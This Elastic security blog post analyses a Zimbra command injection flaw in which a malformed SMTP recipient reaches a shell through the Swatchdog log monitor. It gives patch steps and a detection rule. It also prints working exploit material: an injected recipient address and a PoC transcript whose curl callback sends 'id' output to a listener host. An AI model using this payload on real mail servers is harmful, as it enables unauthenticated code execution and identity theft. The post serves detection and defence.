---
title: Zimbra command injection vulnerability, CVE-2026-73570
author: Eric Forte
url: https://www.elastic.co/security-labs/threat-command/command-injection-zimbra-cve-2026-73570
hostname: elastic.co
description: A single malformed email address turns a Zimbra log file into code execution. How the command injection vulnerability works, plus the detection rule.
sitename: Elastic
date: "2026-10-23"
fingerprint: fe2c8dd1e5082ae1
---
[Threat Command](https://www.elastic.co/security-labs/threat-command)

# How CVE-2026-73570 turns a Zimbra log file into remote code execution

We reproduced the Zimbra command injection vulnerability and found that several public PoCs write a payload Swatchdog never matches, so a failed test looks like a patched server.

When we are building detections for various threats, we regularly run the exploits on representative systems to help us build high-quality rules. The Common Vulnerabilities and Exposures (CVE) entry CVE-2026-73570 for Zimbra is no exception. Zimbra is a widely used enterprise email and collaboration software platform, known for its SMTP platform, among other services. SMTP plays a critical role in the infrastructure of many organizations by providing email services that often include either direct or indirect identity management. In addition to the direct appeal for attackers to read emails, attachments, etc., there is also an appeal for compromised identity management. A compromised mail server can be used to impersonate legitimate accounts for further access and exploitation, becoming a staging ground for additional targets.

CVE-2026-73570 is an unauthenticated command injection vulnerability in Zimbra, and one malformed recipient address is enough to trigger it. Send a malformed request and it is logged in `/var/log/zimbra.log`. From there, the Swatchdog monitoring daemon matches it against a service status pattern and passes it to `/bin/sh` inside a backticked Perl string. The result is remote code execution as the `zimbra` user. The account reads every mailbox on the server and sends as any local identity, so compromising the mail server compromises the identities it serves.

We reproduced the full chain while [building detections](https://github.com/elastic/detection-rules/pull/6933) for it, and several of the public proofs of concept (PoCs) we tested write a payload that Swatchdog never matches, so a failed test looks like a patched server. The working chain is shown next, along with the rule that fires when a shell spawns anything other than `snmptrap`.

Note that if you host Zimbra Simple Mail Transfer Protocol (SMTP) services and haven’t patched to version 10.1.20+, please do so before trying out the steps in this blog post.

## How the Zimbra command injection vulnerability works

The core entry point for this kind of attack is CVE-2026-73570, a vulnerability in an unpatched Zimbra service (patched as of Zimbra version 10.1.20). When exploited, it can provide arbitrary remote code execution bypassing authentication requirements. To do this, an attacker passes a specifically crafted SMTP message that’s written to the notification file /var/log/zimbra.log for processing. Under normal circumstances, entries are written to this log to keep track of the status of services, such as when a given mailbox service has started or a message delivery has failed:

```
Sep 30 22:48:29 mail postfix/pickup[57597]: 6272F1E1393: uid=997 from=<zimbra>
Sep 30 22:48:29 mail postfix/cleanup[57599]: 6272F1E1393: message-id=<20261001024829.6272F1E1393@mail.lab.test>
Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: from=<zimbra@mail.lab.test>, size=604, nrcpt=1 (queue active)
Sep 30 22:48:29 mail postfix/error[57602]: 6272F1E1393: to=<zimbra@mail.lab.test>, orig_to=<zimbra>, relay=none, delay=4707, delays=4707/0.01/0/0.01, dsn=5.0.0, status=bounced (mail.lab.test)
Sep 30 22:48:29 mail postfix/cleanup[57599]: 6DD441E13F5: message-id=<20261001024829.6DD441E13F5@mail.lab.test>
Sep 30 22:48:29 mail postfix/bounce[57603]: 6272F1E1393: sender non-delivery notification: 6DD441E13F5
Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: from=<>, size=2463, nrcpt=1 (queue active)
Sep 30 22:48:29 mail postfix/qmgr[57598]: 6272F1E1393: removed
Sep 30 22:48:29 mail postfix/error[57602]: 6DD441E13F5: to=<zimbra@mail.lab.test>, relay=none, delay=0.01, delays=0.01/0/0/0, dsn=5.0.0, status=bounced (mail.lab.test)
Sep 30 22:48:29 mail postfix/qmgr[57598]: 6DD441E13F5: removed
```
Figure 2: Log indication that a message failed to be delivered to zimbra@mail.lab.test.

As part of the monitoring components of Zimbra, a daemon called `Swatchdog` watches this file for specific log entries that match the format of a service status change:

```
Service status change: <host> <service> changed from stopped to running
Service status change: <host> <service> changed from running to stopped
```
Figure 3: Normal service message.

When an entry is identified and SNMP notifications are enabled, it invokes a notification function that generates an `snmptrap`, a one-way alert from the mail server to a monitoring host. The target of CVE-2026-73570 is the way that this message is constructed. The SNMP notification message is parsed with Perl. Zimbra packages a copy of the Perl program `Swatchdog` to handle this parsing and monitor logs. It tails the log file and compiles `/opt/zimbra/conf/swatchrc.in` into a Perl script using `perlcode` lines to directly embed Perl commands into that script. By inspecting the contents of `swatchrc.in`, we can see the vulnerability in this process. In version `Release 10.1.16.BETA.4200001.UBUNTU24.64 UBUNTU24_64 FOSS edition`, this is line 26, specifically the `dosnmp` call:

```
perlcode 0 my $snmptrap="/opt/zimbra/common/bin/snmptrap $snmpargs";
perlcode 0 my $snmpsvctrap="ZIMBRA-TRAP-MIB::zmServiceStatusTrap";
perlcode 0 my $snmpsvcname="ZIMBRA-MIB::zmServiceName";
perlcode 0 my $snmpsvcstatus="ZIMBRA-MIB::zmServiceStatus";
...
perlcode 0 sub dosnmp {   my %args = (@_); print "SNMP notification: $args{MESSAGE}\n"; `$snmptrap $snmpsvctrap $snmpsvcname s $args{SERVICE} $snmpsvcstatus i $statuses{$args{STATUS}}`; }
```
Figure 5: Status 1 for service “mailbox”.

However, the service name is built from `$args{SERVICE}` and is vulnerable to injection through log messages matching the service format. Injecting a log message is straightforward, as Postfix already records pieces of what any given SMTP client sent. So an attacker just needs to send a message that will end up in this log file. One method of doing this is to supply a message with an invalid address syntax.

A normal SMTP message includes a `MAIL FROM` section, denoting the sender, and a `RCPT TO`, specifying the recipient, along with `DATA`, which is the message. The first two require the email address to be wrapped in angle brackets; for example, `<``address@host.name``>`. If an attacker doesn’t follow the wrapping and omits the final >, the specified unclosed address will show up in the log file. For example, an address of `<``address@host.name` will have a log entry as follows:

`warning: Illegal address syntax from mail.lab.test[10.0.2.15] in RCPT command:<address@host.name`
Figure 6: Invalid recipient log entry.

Since the attacker controls this address, they can then specify a payload that will match the pattern that the daemon is looking for, `Service status change: <host> <service>`. Instead of supplying a valid host and service, the service can be replaced with arbitrary commands; for example `$(touch /tmp/manual_test.txt)`. This will then be run as the original Perl process calls `/bin/sh` to send the notification. With this, the attacker has arbitrary remote code execution (RCE) on the target, including the ability to masquerade as other email identities from this server.

The full chain, from inbound message to code execution, is as follows:

| **Stage** | **Component** | **Artifact** | 
| Delivery | Postfix | Malformed `RCPT TO` logged to `/var/log/zimbra.log.` | 
| Trigger | Swatchdog | Log line matches the service status pattern. | 
| Execution | Perl `dosnmp` | Backticks pass `$args{SERVICE}` to `/bin/sh.` | 
| Impact | `zimbra` user | Code execution, identity access. | 

## Why most public CVE-2026-73570 PoCs fail

Given the ability to execute arbitrary code, an attacker can use a number of different mechanisms to establish persistence and gain further access. In testing these approaches, we found that many of the existing PoCs didn’t fully establish the RCE chain. In some cases, the PoCs wrote incorrectly formatted commands to the log file, preventing their execution. As a result, we developed a PoC that runs a variety of commands. We also include tests that run against a remote host and send a callback to a locally running web server. With this approach, we can see that the attack works without causing any additional on-disk changes to the target:

```
elastic@test-as89074:~$ python3 CVE-2026-73570_poc.py --host 10.0.2.15 --command "id" --listen
[*] Scanning standard SMTP ports on 10.0.2.15...
  [+] Port  25 (SMTP) : OPEN
  [-] Port 587 (SMTP) : CLOSED/FILTERED
[*] Targeting 10.0.2.15:25 (Plain SMTP)
[*] OOB Listener URL: http://10.0.2.16:8080/capture/abc123/
[*] Payload: x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running
[*] Full RCPT TO: <"x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running"@cve.invalid>
[<] 220 mail.lab.test ESMTP Postfix
[>] EHLO localhost
[<] 250-mail.lab.test
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
[>] MAIL FROM:<test@test.com>
[<] 250 2.1.0 Ok
[>] RCPT TO:<"x: Service status change: localhost $(curl "http://10.0.2.16:8080/capture/abc123/$( id | tr -d ' ' )") changed from stopped to running"@cve.invalid>
[<] 501 5.1.3 Bad recipient address syntax
[*] Waiting up to 10 seconds for OOB callback...
[*] Internal OOB listener started on http://10.0.2.16:8080/capture/...
[***] OOB CALLBACK RECEIVED [***]
[+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix)
[+] SUCCESS: The malicious payload was executed!
[+] Captured Data: uid=997(zimbra)gid=982(zimbra)groups=982(zimbra),5(tty),981(postfix)
```
Figure 8: PoC successful execution using a callback.

## How to patch and detect CVE-2026-73570

Zimbra has patched this vulnerability. To remediate and detect CVE-2026-73570, take the following steps:

1. **Upgrade to Zimbra 10.1.20 or later.** This is the only complete fix.
2. Install Elastic Defend (if you haven’t already).
3. Enable the `Zimbra Swatchdog SNMP Command Injection Execution` security information and event management (SIEM) rule to detect exploitation and to hunt retroactively for pre-patch attempts.

```
sequence by host.id with maxspan=30s
  [process where
    host.os.type == "linux" and
    event.type == "start" and
    event.action in ("exec", "exec_event", "start") and
    process.name in ("sh", "bash", "dash", "ash", "zsh", "ksh") and
    process.parent.name like~ "perl*" and
    process.parent.command_line like~ "*.swatchdog_script*" and
    process.command_line like~ "*snmptrap*" and
    process.command_line like~ "*zmservicename*" and
    process.command_line like~ "*zmservicestatus*"
  ] by process.entity_id
  [process where
    host.os.type == "linux" and
    event.type == "start" and
    event.action in ("exec", "exec_event", "start") and
    process.name != "snmptrap"
  ] by process.parent.entity_id
```
The Zimbra Swatchdog detection rule identifies a sequence of processes that break from the normal Zimbra pattern. First, a shell process, `/bin/sh` in the prior example, is started from a parent watchdog script Perl process and has `snmptrap` in its command arguments, matching the expected call `/opt/zimbra/common/bin/snmptrap ... ZIMBRA-MIB::zmServiceName s mailbox ...` from earlier. Second, the rule detects a subprocess launched by the shell identified in the first step, provided that the subprocess isn’t `snmptrap`. Since the only process that should run under legitimate circumstances is `snmptrap`, this is a very strong indicator of successful exploitation.

If you detect a compromise, hunt for:

- Standard indicators of remote code execution on the host.
- Phishing emails originating from the server.
- Compromise of local databases and signing keys, as well as LDAP exports.
- Less direct surfaces beyond the mail store itself.
